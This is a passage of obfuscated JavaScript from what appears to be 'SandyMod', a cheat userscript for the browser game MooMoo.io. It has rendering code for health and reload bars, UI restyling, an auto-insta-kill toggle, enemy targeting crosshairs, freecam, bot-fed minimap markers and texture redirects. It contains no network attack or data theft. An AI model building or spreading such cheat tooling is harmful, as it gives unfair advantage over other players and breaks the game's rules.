                                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                 be.fill());
                                if(spec) return;
                                y -= 15;
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = ae86 ? "#8f815a" : getBarColor(_.secondaryReload, 0);
                                be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * _.secondaryReload, (17-pad*2), 8);
                                be.fill();
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = ae86 ? "#8f815a" : getBarColor(_.primaryReload, 1);
                                be.roundRect(x+pad, y+pad, (eachBarWidth-pad) * _.primaryReload, (17-pad*2), 8);
                                be.fill();
                            } else if(!vs && false) {
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt, be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(), be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151", be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7), be.fill())
                                if(spec) return;
                                reloads.forEach((e, index) => {
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x + (eachBarWidth*index+1), y, eachBarWidth, 17, 8);
                                    be.fill();
                                    be.fillStyle = getBarColor(e, index==0);
                                    be.roundRect(x + (eachBarWidth*index+1)+pad, y+pad, (eachBarWidth-pad*2) * e, (17-pad*2), 8);
                                    be.fill();
                                });
                            } else if(lur) {
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                 be.fill());
                                if(spec) return;
                                y -= 15;
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = "#c7c962";
                                be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * _.secondaryReload, (17-pad*2), 8);
                                be.fill();
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = "#c7c962";
                                be.roundRect(x+pad, y+pad, (eachBarWidth-pad) * _.primaryReload, (17-pad*2), 8);
                                be.fill();
                            } else if(sandy) {
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                 be.fill());
                                if(spec) return;
                                y -= 15;
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = "#FFF";
                                be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * _.secondaryReload, (17-pad*2), 8);
                                be.fill();
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = "#FFF";
                                be.roundRect(x+pad, y+pad, (eachBarWidth-pad) * _.primaryReload, (17-pad*2), 8);
                                be.fill();
                            }
                        } else {
                            _.health > 0 &&
                                (o.healthBarWidth,
                                 be.fillStyle = rt,
                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8),
                                 be.fill(),
                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7), be.fill())
                        }
                    }

                    let fzVisualStuff0 = [
                        ['leaderboard', {'top': '20px', 'left': '20px', 'position': 'fixed'}],
                        ['killCounter', {'right': '11px', 'bottom': '11px', 'position': 'fixed'}],
                        ['woodDisplay', {'display': 'none'}],
                        ['stoneDisplay', {'display': 'none'}],
                        ['foodDisplay', {'display': 'none'}]
                        //['scoreDisplay', {'background-position': 'right 6px center', 'padding-left': '10px', 'padding-right': '40px', 'left': 'inherit', 'right': '20px', 'bottom': '240px', 'position': 'fixed'}],
                        /* FZ UI */
                    ], fzVisualStuff1 = [
                        ['leaderboard', {'top': '0px', 'right': '0px', 'position': 'static'}],
                        ['storeButton', {'right': '330px', 'left': '', 'width': '40px', 'position': 'fixed'}],
                        ['allianceButton', {'right': '270px', 'left': '', 'width': '40px', 'position': 'fixed'}],
                        ['killCounter', {'right': '-170px', 'bottom': '0px', 'width': '20px', 'position': 'relative'}],
                        ['scoreDisplay', {'background-position': 'left 6px center', 'padding-right': '10px', 'text-align': 'left', 'padding-left': '40px', 'right': 'inherit', 'left': '20px', 'bottom': '160px', 'position': 'fixed'}],
                        /* ORIGINAL MOOMOO UI */
                    ];
                    let menuHidden = false;
                    setInterval(() => {
                        if (fz) {
                            document.getElementById('mapDisplay').style.backgroundImage = "url('https://i.imgur.com/fgFsQJp.png')";
                            try {$("#minimap").toggle();} catch (e) {};
                            for(let i = 0;i < fzVisualStuff0.length;i++) {
                                let element = fzVisualStuff0[i][0],
                                    css = fzVisualStuff0[i][1];
                                $('#' + element).css(css);
                            }
                            $('#chatButton').css({'display': 'none'});
                            if (menuHidden) {
                                let buttonthings = [
                                    ['storeButton', {'left': '270px', 'width': '40px', 'position': 'absolute'}],
                                    ['allianceButton', {'left': '330px', 'width': '40px', 'position': 'absolute'}]
                                ];
                                for(let i = 0;i < buttonthings.length;i++) {
                                    $('#' + buttonthings[i][0]).css(buttonthings[i][1]);
                                }
                            } else {
                                let buttonthings = [
                                    ['storeButton', {'left': '500px', 'width': '40px', 'position': 'absolute'}],
                                    ['allianceButton', {'left': '560px', 'width': '40px', 'position': 'absolute'}]
                                ];
                                for(let i = 0;i < buttonthings.length;i++) {
                                    $('#' + buttonthings[i][0]).css(buttonthings[i][1]);
                                }
                            }
                            fZTAGDT.style.display = "block";
                            document.getElementById('leaderboard').style.display = menuHidden ? 'block' : "none";
                        } else {
                            $("#mapDisplay").css("background", "rgba(0, 0, 0, 0.25)"), $("#minimap").toggle();
                            fZTAGDT.style.display = "none";
                            for(let i = 0;i < fzVisualStuff1.length;i++) {
                                let element = fzVisualStuff1[i][0],
                                    css = fzVisualStuff1[i][1];
                                $('#' + element).css(css);
                            }
                            $('#chatButton').css({'display': 'block'});
                            document.getElementById("leaderboard").style.display = "block";
                        }

                        document.getElementsByTagName("autoinstafz")[0].innerText = autoinsta ? "ON" : "OFF";
                        document.getElementsByTagName("autoinstafz")[0].style.fontSize = "17px";
                        document.getElementsByTagName("eab")[0].innerText = "{hit:0,miss:0}";
                        document.getElementsByTagName("eab")[0].style.fontSize = "17px";
                        document.getElementsByTagName("placer")[0].innerText = doExtremeReplacer ? "ON" : "OFF";
                        document.getElementsByTagName("placer")[0].style.fontSize = "17px";
                        document.getElementsByTagName("musicfz")[0].innerText = Object.getOwnPropertyNames(this).filter(e => !["playing", "doing", "current", "loadAudio"].includes(e)).every(e => autochats[e].audio.paused) ? "OFF" : "ON"; // reverse to maintain fz visuals (he always has this disabled, but i like having it enabled)
                        document.getElementsByTagName("musicfz")[0].style.fontSize = "17px";
                        //[Auto] Now playing:, [Auto] Stopped playing (plays when the autochats end/start)
                    }, 0);
                    let fZTAGDT = document.createElement("div");
                    fZTAGDT.id = 'fz-top-right-text-thing';
                    fZTAGDT.innerHTML = `

                    SANDY Auto-Insta: <autoinstafz class="fzthignign">OFF</autoinstafz><br>
                    SANDY EAB: <eab class="fzthignign">{hit:0, miss:0}</eab><br>
                    SANDY Music: <musicfz class="fzthignign">OFF</musicfz><br>
                    SANDY AdvPlacer: <placer class="fzthignign">OFF</placer><br>
                    `;
                    fZTAGDT.style = `
                    display: none;
                    color: white;
                    font-size: 19px;
                    top: 50px;
                    right: 35px;
                    position: fixed;
                    `;
                    document.body.appendChild(fZTAGDT);

                    function Ii(e) {
                        for (var t = 0; t < W.length; ++t)
                            if (W[t].sid == e) return W[t];
                        return null
                    }

                    function Ei(e) {
                        for (var t = 0; t < Y.length; ++t)
                            if (Y[t].sid == e) return Y[t];
                        return null
                    }

                    function Mi(e) {
                        for (var t = 0; t < N.length; ++t)
                            if (N[t].sid == e) return N[t];
                        return null
                    }
                    var Ai = -1, freecam = false, camX = 0, camY = 0, camAng = 0;

                    let Pings = { highest: -1, lowest: 1e3 };

                    function Pi() {
                        var e = Date.now() - Ai;
                        window.pingTime = e, Ie.innerText = "Ping: " + e;
                        if(R && R.alive && window.pingTime > 0) {
                            e < Pings.lowest ? Pings.lowest = e : e > Pings.highest ? Pings.highest = e : null;
                        }
                    }

                    function Bi() {
                        Ai = Date.now(), r.send("pp")
                    }

                    function Ci(e) {
                        if (!(e < 0)) {
                            var t = Math.floor(e / 60),
                                n = e % 60;
                            n = ("0" + n).slice(-2), Ee.innerText = "Server restarting in " + t + ":" + n, Ee.hidden = !1
                        }
                    }

                    function Oi(e) {
                        window.open(e, "_blank")
                    }
                    var targ = new Image(256, 256), LX = l, nightTime = false;
                    var targ2 = new Image(512, 512);
                    targ.src = "https://media.discordapp.net/attachments/979763292316770345/980251044099538974/unknown.png";
                    targ2.src = "https://cdn.discordapp.com/attachments/975784551982968913/1053864040281165905/crosshair.png";
                    window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(e) {
                        window.setTimeout(e, 1e3 / 60)
                    },
                        function() {
                        var e = o.mapScale / 2;
                        nt.add(0, e, e + 200, 0, o.treeScales[3], 0), nt.add(1, e, e - 480, 0, o.treeScales[3], 0), nt.add(2, e + 300, e + 450, 0, o.treeScales[3], 0), nt.add(3, e - 950, e - 130, 0, o.treeScales[2], 0), nt.add(4, e - 750, e - 400, 0, o.treeScales[3], 0), nt.add(5, e - 700, e + 400, 0, o.treeScales[2], 0), nt.add(6, e + 800, e - 200, 0, o.treeScales[3], 0), nt.add(7, e - 260, e + 340, 0, o.bushScales[3], 1), nt.add(8, e + 760, e + 310, 0, o.bushScales[3], 1), nt.add(9, e - 800, e + 100, 0, o.bushScales[3], 1), nt.add(10, e - 800, e + 300, 0, l.list[4].scale, l.list[4].id, l.list[10]), nt.add(11, e + 650, e - 390, 0, l.list[4].scale, l.list[4].id, l.list[10]), nt.add(12, e - 400, e - 450, 0, o.rockScales[2], 2)
                    }(),
                        function e() {
                        let frameSpeed = Date.now() - lastframes;
                        lastframes = Date.now();
                        let oq = qual;
                        if(frameSpeed > 30) {
                            qual *= .8;
                            V = qual;
                        } else {
                            qual = 1;
                            V = qual;
                        }
                        if(qual != oq) {
                            un();
                        }
                        try {
                            autochats[autochats.current].audio.volume = document.getElementById("mscVolume").value / 100;
                        } catch (e) {};
                        B = Date.now(), P = B - q, q = B,
                            function() {
                            if (R && (!C || B - C >= 1e3 / o.clientSendRate) && (C = B), An < 120 && (An += .1 * P, Ge.style.fontSize = Math.min(Math.round(An), 120) + "px"), R) {
                                var e = s.getDistance(U, D, R.x, R.y),
                                    t = s.getDirection(R.x, R.y, U, D),
                                    n = Math.min(.01 * e * P, e);
                                e > .05 ? (U += n * Math.cos(t), D += n * Math.sin(t)) : (U = R.x, D = R.y)
                            } else U = o.mapScale / 2, D = o.mapScale / 2;
                            for (var i = B - 1e3 / o.serverUpdateRate, a = 0; a < W.length + Y.length; ++a)
                                if ((_ = W[a] || Y[a - W.length]) && _.visible)
                                    if (_.forcePos) _.x = _.x2, _.y = _.y2, _.dir = _.d2;
                                    else {
                                        var c = _.t2 - _.t1,
                                            l = (i - _.t1) / c;
                                        _.dt += P;
                                        var h = Math.min(1.7, _.dt / 170),
                                            u = _.x2 - _.x1;
                                        _.x = _.x1 + u * h, u = _.y2 - _.y1, _.y = _.y1 + u * h, _.dir = Math.lerpAngle(_.d2, _.d1, Math.min(1.2, l))
                                    };

                            var f = U - oe / 2,
                                d = D - ce / 2;

                            if(freecam) {
                                if(!isNaN(camAng)) {
                                    camX += 10 * Math.cos(camAng);
                                    camY += 10 * Math.sin(camAng);
                                }
                                f += camX;
                                d += camY;
                            }

                            o.snowBiomeTop - d <= 0 && o.mapScale - o.snowBiomeTop - d >= ce ? (be.fillStyle = "#b6db66", be.fillRect(0, 0, oe, ce)) : o.mapScale - o.snowBiomeTop - d <= 0 ? (be.fillStyle = "#dbc666", be.fillRect(0, 0, oe, ce)) : o.snowBiomeTop - d >= ce ? (be.fillStyle = "#fff", be.fillRect(0, 0, oe, ce)) : o.snowBiomeTop - d >= 0 ? (be.fillStyle = "#fff", be.fillRect(0, 0, oe, o.snowBiomeTop - d), be.fillStyle = "#b6db66", be.fillRect(0, o.snowBiomeTop - d, oe, ce - (o.snowBiomeTop - d))) : (be.fillStyle = "#b6db66", be.fillRect(0, 0, oe, o.mapScale - o.snowBiomeTop - d), be.fillStyle = "#dbc666", be.fillRect(0, o.mapScale - o.snowBiomeTop - d, oe, ce - (o.mapScale - o.snowBiomeTop - d))), In || ((ee += te * o.waveSpeed * P) >= o.waveMax ? (ee = o.waveMax, te = -1) : ee <= 1 && (ee = te = 1), be.globalAlpha = 1, be.fillStyle = "#dbc666", qn(f, d, be, o.riverPadding), be.fillStyle = "#91b2db", qn(f, d, be, 250 * (ee - 1)));

                            if(!vs) {
                                be.lineWidth = 4, be.strokeStyle = "#000", be.globalAlpha = .06, be.beginPath();
                                for (var p = -U - camX; p < oe; p += ce / 18) p > 0 && (be.moveTo(p, 0), be.lineTo(p, ce));
                                for (var g = -D - camY; g < ce; g += ce / 18) p > 0 && (be.moveTo(0, g), be.lineTo(oe, g));
                                be.stroke();
                            }

                            for (be.globalAlpha = 1, be.strokeStyle = it, Yn(-1, f, d), be.globalAlpha = 1, be.lineWidth = vs ? 2 : 5.5, zn(0, f, d), Xn(f, d, 0), be.globalAlpha = 1, a = 0; a < Y.length; ++a)(_ = Y[a]).active && _.visible && (_.animate(P), be.save(), be.translate(_.x - f, _.y - d), be.rotate(_.dir + _.dirPlus - Math.PI / 2), yi(_, be), be.restore());
                            if (Yn(0, f, d), zn(1, f, d), Yn(1, f, d), Xn(f, d, 1), Yn(2, f, d), Yn(3, f, d), be.fillStyle = "#000", be.globalAlpha = .09, f <= 0 && be.fillRect(0, 0, -f, ce), o.mapScale - f <= oe) {
                                var y = Math.max(0, -d);
                                be.fillRect(o.mapScale - f, y, oe - (o.mapScale - f), ce - y)
                            }
                            if (d <= 0 && be.fillRect(-f, 0, oe + f, -d), o.mapScale - d <= ce) {
                                var k = Math.max(0, -f),
                                    v = 0;
                                o.mapScale - f <= oe && (v = oe - (o.mapScale - f)), be.fillRect(k, o.mapScale - d, oe - k - v, ce - (o.mapScale - d))
                            }
                            try {
                                /*nearBuilds.forEach(_ => {
                                    if(_.active && Date.now() - _.lastAttr < 2000) {
                                        if(_.health > 0) {
                                            be.beginPath();
                                            be.strokeStyle = rt;
                                            be.lineWidth = 8;
                                            be.lineCap = "round";
                                            be.moveTo(_.x - f - _.scale/2, _.y - d);
                                            be.lineTo(_.x - f + (_.scale/2), _.y - d);
                                            be.stroke();
                                            be.closePath();
                                            be.beginPath();
                                            be.strokeStyle = _.owner && _.owner.sid && _.owner.sid == R.sid ? "#8ecc51" : "#cc5151";
                                            be.lineWidth = 6;
                                            be.lineCap = "round";
                                            be.moveTo(_.x - f - _.scale/2, _.y - d);
                                            be.lineTo(_.x - f - _.scale/2 + ((_.scale) * (_.health / _.health1)), _.y - d);
                                            be.stroke();
                                            be.closePath();
                                        }
                                    }
                                });*/
                            } catch (t) {};

                            try {
                                if(!pathFind.show) WebSocket(123);
                                be.beginPath();
                                be.strokeStyle = "red";
                                be.globalAlpha = 1;
                                be.lineWidth = 3;
                                be.moveTo(R.x-f, R.y-d);
                                for(let i = 0; i < pathFind.paths.length; i++) {
                                    let a = pathFind.paths[i];
                                    be.lineTo(a.x - f, a.y - d);
                                }
                                be.stroke();

                            } catch (e) {};

                            for (be.globalAlpha = 1, be.fillStyle = "rgba(0, 0, 70, 0.35)", be.fillRect(0, 0, oe, ce),
                                 function () {
                                try {
                                    be.globalAlpha = 1;
                                    be.font = "20px Hammersmith One",
                                        be.fillStyle = "white";
                                    notifications = notifications.length <= 5 ? notifications : notifications.slice(5)
                                    notifications.forEach((e, i) => {
                                        be.fillText(e, 50 + be.measureText(e).width/2, 70 + i*30);
                                    });
                                } catch (e) {};
                            } (), be.strokeStyle = rt, a = 0; a < W.length + Y.length; ++a)
                                if ((_ = W[a] || Y[a - W.length]).visible && (10 != _.skinIndex || _ == R || _.team && _.team == R.team)) {

                                    if(1) {
                                        var w = (rv2 && _.isPlayer ? "[" + _.primary + "/" + _.secondary + "] " : "") + (_.team ? "[" + _.team + "] " : "") + (_.name || "") + (_.isPlayer ? " [SandyMod v3]" : "");
                                        if ("" != w) {
                                            if (be.font = (_.nameScale || 30) + (don ? "px Oxygen" : "px Hammersmith One"), be.fillStyle = "#fff", be.strokeStyle=rt, be.textBaseline = "middle", be.textAlign = "center", be.lineWidth = _.nameScale ? 11 : 8, be.lineJoin = "round", (don ? "" : be.strokeText(w, _.x - f, _.y - d - _.scale - o.nameY)), be.fillText(w, _.x - f, _.y - d - _.scale - o.nameY), _.isLeader && Rn.crown.isLoaded) {
                                                var b = o.crownIconScale;
                                                k = _.x - f - b / 2 - be.measureText(w).width / 2 - o.crownPad, be.drawImage(Rn.crown, k, _.y - d - _.scale - o.nameY - b / 2 - 5, b, b)
                                            }
                                            be.fillStyle = "#fff";
                                            be.strokeStyle = rt;
                                            1 == _.iconIndex && Rn.skull.isLoaded && (b = o.crownIconScale, k = _.x - f - b / 2 + be.measureText(w).width / 2 + o.crownPad, be.drawImage(Rn.skull, k, _.y - d - _.scale - o.nameY - b / 2 - 5, b, b))
                                        }

                                        if(_.isPlayer && !spec && !lur && !ae86 && !don) {
                                            b = o.crownIconScale;
                                            k = _.x - f - b / 2 + be.measureText(w).width / 2 + o.crownPad;
                                            be.font = (_.nameScale || 30) + "px HammerSmith One";
                                            be.fillStyle = "#FF0000";
                                            be.strokeStyle = rt;
                                            be.textBaseline = "middle";
                                            be.textAlign = "center";
                                            be.lineWidth = _.nameScale ? 11 : 8;
                                            be.lineJoin = "round";
                                            be.strokeText(_.skinIndex === 45 ? 8 : _.clownCounter, k + (1 == _.iconIndex ? 85 : 30), _.y - d - _.scale - o.nameY),
                                                be.fillText(_.skinIndex === 45 ? 8 : _.clownCounter, k + (1 == _.iconIndex ? 85 : 30), _.y - d - _.scale - o.nameY);
                                        }
                                        drawBars(_, f, d);
                                        if(_.isPlayer) {
                                            addTexts(f, d);
                                        }

                                        if(!vs && enemies[0] && _.sid == enemies[0].sid && autoinsta && !chain) {
                                            var targ = new Image(256, 256);
                                            targ.src = "https://media.discordapp.net/attachments/988117602486341662/1001453092841209917/nTXLnrRXc.webp?width=701&height=701";
                                            be.drawImage(targ, _.x-f-35, _.y-d-35, 70, 70);
                                        }
                                        if(!vs && enemies[0] && _.sid == enemies[0].sid && autoinsta && chain) {
                                            var targ2 = new Image(256, 256);
                                            targ2.src = "https://cdn.discordapp.com/attachments/975784551982968913/1053864040281165905/crosshair.png";
                                            be.drawImage(targ2, _.x-f-35, _.y-d-35, 70, 70);
                                        }
                                    }

                                } for (m.update(P, be, f, d, vs), a = 0; a < W.length; ++a)
                                    if ((_ = W[a]).visible && _.chatCountdown > 0) {
                                        _.chatCountdown -= P, _.chatCountdown <= 0 && (_.chatCountdown = 0), be.font = "32px Hammersmith One";
                                        var x = be.measureText(_.chatMessage);
                                        be.textBaseline = "middle", be.textAlign = "center", k = _.x - f, y = _.y - _.scale - d - 90;
                                        var S = x.width + 17;
                                        be.fillStyle = "rgba(0,0,0,0.2)", be.roundRect(k - S / 2, y - 23.5, S, 47, 6), be.fill(), be.fillStyle = "#fff", be.fillText(_.chatMessage, k, y)
                                    }!
                                        function(e) {
                                        if (R && R.alive) {
                                            Ke.clearRect(0, 0, Ne.width, Ne.height), Ke.strokeStyle = "#fff", Ke.lineWidth = 4;
                                            for (var t = 0; t < qt.length; ++t)(Vt = qt[t]).update(Ke, e);
                                            if (Ke.globalAlpha = 1, Ke.fillStyle = "#fff", si(R.x / o.mapScale * Ne.width, R.y / o.mapScale * Ne.height, 7, Ke, !0), Ke.fillStyle = "rgba(255,255,255,0.35)", R.team && Et)
                                                for (t = 0; t < Et.length;) si(Et[t] / o.mapScale * Ne.width, Et[t + 1] / o.mapScale * Ne.height, 7, Ke, !0), t += 2;
                                            It && (Ke.fillStyle = "#fc5553", Ke.font = "34px Hammersmith One", Ke.textBaseline = "middle", Ke.textAlign = "center",
                                                   Ke.fillText("x", It.x / o.mapScale * Ne.width, It.y / o.mapScale * Ne.height)), Mt &&
                                                (Ke.fillStyle = "#fff", Ke.font = "34px Hammersmith One", Ke.textBaseline = "middle", Ke.textAlign = "center",
                                                 Ke.fillText("x", Mt.x / o.mapScale * Ne.width, Mt.y / o.mapScale * Ne.height))

                                            for(let bot of botPackets) {
                                                bot.forEach((coords) => {
                                                    if(R && R.alive && !Pt.includes(coords.id) && coords.id != R.sid) {
                                                        Ke.fillStyle =  coords.type == "bot" ? "#fff" : "#fc5553", Ke.font = "34px Hammersmith One", Ke.textBaseline = "middle", Ke.textAlign = "center",
                                                            Ke.fillText( coords.type == "bot" ? "o" : "x", coords.x / o.mapScale * Ne.width, coords.y / o.mapScale * Ne.height)
                                                    }
                                                });
                                            }
                                        }
                                    }(P), -1 !== re.id && Fn(re.startX, re.startY, re.currentX, re.currentY), -1 !== se.id && Fn(se.startX, se.startY, se.currentX, se.currentY)
                        }(),
                            Nights += ((don ? nightMode = 1 : nightMode = 0) - Nights) / 160;
                        const eb = be.getTransform();
                        be.setTransform(1, 0, 0, 1, 0, 0);
                        be.fillStyle = `rgba(${[24, 0, 82, .3].map(e => e * Nights).join(", ")})`,
                            be.fillRect(0, 0, we.width, we.height);
                        be.setTransform(eb);
                        window.requestAnimFrame(e);
                    }(), window.openLink = Oi, window.aJoinReq = Dt, window.follmoo = function() {
                        H || (H = !0, I("moofoll", 1))
                    }, window.kickFromClan = Lt, window.sendJoin = Ft, window.leaveAlliance = Ht, window.createAlliance = zt, window.storeBuy = Kt, window.storeEquip = Jt, window.showItemInfo = Tt, window.selectSkinColor = function(e) {
                        ae = e, en()
                    }, window.changeStoreIndex = function(e) {
                        Xt != e && (Xt = e, Gt())
                    }, window.config = o

                    function transformURL(e) {
                        return "../."+e.slice(e.indexOf("/img"), e.length)
                    }

                    function TEXTURE(rules) {
                        return Object.fromEntries(rules = rules.map(e => Object.entries(e)).flat(1).filter(e => e[0] == "pairs").flat(1).filter(e => e != "pairs").flat(1).map(e => [transformURL(e.source.value), e.destination]),rules.filter((i, p) => rules.indexOf(i) == p), rules);
                    }
                    const localTexture = [{creationDate:1539776483046,description:"",groupId:"",id:"Redirect_1539776483046",name:"Halloween",objectType:"rule",pairs:[{destination:"https://i.imgur.com/GB4qvv0.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_23.png"}},{destination:"https://i.imgur.com/A3HllcC.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_46.png"}},{destination:"https://i.imgur.com/IB4iBZm.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_10.png"}},{destination:"https://i.imgur.com/ABHSOd9.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_48.png"}},{destination:"https://i.imgur.com/cvb9q8g.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_4.png"}},{destination:"https://i.imgur.com/gGGkBnz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_27.png"}},{destination:"https://i.imgur.com/GB4qvv0.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_23.png"}},{destination:"https://i.imgur.com/A3HllcC.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_46.png"}},{destination:"https://i.imgur.com/IB4iBZm.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_10.png"}},{destination:"https://i.imgur.com/ABHSOd9.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_48.png"}},{destination:"https://i.imgur.com/cvb9q8g.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_4.png"}},{destination:"https://i.imgur.com/gGGkBnz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_27.png"}},{destination:"https://i.imgur.com/GB4qvv0.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_23.png"}},{destination:"https://i.imgur.com/A3HllcC.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_46.png"}},{destination:"https://i.imgur.com/IB4iBZm.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_10.png"}},{destination:"https://i.imgur.com/ABHSOd9.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_48.png"}},{destination:"https://i.imgur.com/cvb9q8g.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_4.png"}},{destination:"https://i.imgur.com/gGGkBnz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_27.png"}},{destination:"https://i.imgur.com/GB4qvv0.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_23.png"}},{destination:"https://i.imgur.com/A3HllcC.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_46.png"}},{destination:"https://i.imgur.com/IB4iBZm.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_10.png"}},{destination:"https://i.imgur.com/ABHSOd9.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_48.png"}},{destination:"https://i.imgur.com/cvb9q8g.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_4.png"}},{destination:"https://i.imgur.com/gGGkBnz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_27.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1537058120972,description:"",groupId:"",id:"Redirect_1537058120972",name:"Texture Pack Sandbox - Ruby",objectType:"rule",pairs:[{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_r.png"}},{destination:"https://i.imgur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_r.png"}},{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_r.png"}},{destination:"https://i.im